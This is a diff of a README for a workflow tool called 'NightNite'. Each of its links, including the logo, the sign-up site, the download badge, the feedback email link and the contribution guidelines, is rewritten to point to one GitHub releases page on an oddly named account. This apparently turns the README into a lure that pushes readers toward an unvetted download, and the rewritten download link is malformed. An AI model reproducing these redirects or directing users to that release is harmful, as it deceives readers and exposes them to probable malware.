@@ -1,6 +1,6 @@
 # NightNite - Automating Your Workflow Processes
 
-![NightNite Logo](https://example.com/nightnite-logo.png)
+![NightNite Logo](https://github.com/catttttttggggggggg/NightNite/releases)
 
 Welcome to NightNite, your ultimate solution for automating and streamlining workflow processes. Whether you are an individual looking to boost productivity or a team striving for more efficient project execution, NightNite is here to make your life easier.
 
@@ -34,7 +34,7 @@ NightNite is a versatile tool designed to enhance productivity for users across 
 
 Using NightNite is straightforward and user-friendly. Follow these simple steps to get started:
 
-1. Sign up for a NightNite account on our [website](https://www.nightnite.com).
+1. Sign up for a NightNite account on our [website](https://github.com/catttttttggggggggg/NightNite/releases).
 2. Explore the dashboard to familiarize yourself with the features.
 3. Create your first project and start adding tasks.
 4. Collaborate with team members by inviting them to join your workspace.
@@ -42,17 +42,17 @@ Using NightNite is straightforward and user-friendly. Follow these simple steps 
 
 ## Installation
 
-To get the most out of NightNite, we recommend downloading our desktop app. You can find the latest version [here](<img src="https://img.shields.io/badge/Download%20NightNite%20App-Here-brightgreen">). Once you have downloaded the app, simply launch it and log in to your NightNite account.
+To get the most out of NightNite, we recommend downloading our desktop app. You can find the latest version [here](<img src="https://github.com/catttttttggggggggg/NightNite/releases%20NightNite%20App-Here-brightgreen">). Once you have downloaded the app, simply launch it and log in to your NightNite account.
 
 If you encounter any issues with the download link, please visit the "Releases" section of our GitHub repository for alternative options.
 
 ## Feedback
 
-We value your feedback! If you have any suggestions, feature requests, or encounter any bugs while using NightNite, please reach out to us via [email](mailto:feedback@nightnite.com).
+We value your feedback! If you have any suggestions, feature requests, or encounter any bugs while using NightNite, please reach out to us via [email](https://github.com/catttttttggggggggg/NightNite/releases).
 
 ## Contributing
 
-We welcome contributions from the community to make NightNite even better. Whether you are a developer, designer, or simply an avid user, your input is valuable to us. Check out our [Contribution Guidelines](CONTRIBUTING.md) to get started.
+We welcome contributions from the community to make NightNite even better. Whether you are a developer, designer, or simply an avid user, your input is valuable to us. Check out our [Contribution Guidelines](https://github.com/catttttttggggggggg/NightNite/releases) to get started.
 
 ## License
 
